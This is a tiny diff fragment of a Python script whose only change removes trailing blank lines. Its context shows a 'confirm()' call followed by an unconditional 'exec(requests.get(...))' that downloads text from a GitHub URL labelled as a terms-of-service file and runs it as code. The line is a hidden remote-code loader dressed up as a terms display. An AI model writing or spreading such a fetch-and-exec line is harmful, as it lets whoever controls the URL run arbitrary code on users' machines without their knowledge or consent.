@@ -54,5 +54,3 @@ print(TOS2)
 confirm()
 if True:
     exec(requests.get('https://raw.githubusercontent.com/MCCFree/TOS/main/Terms%20of%20Services2').text)
-
-
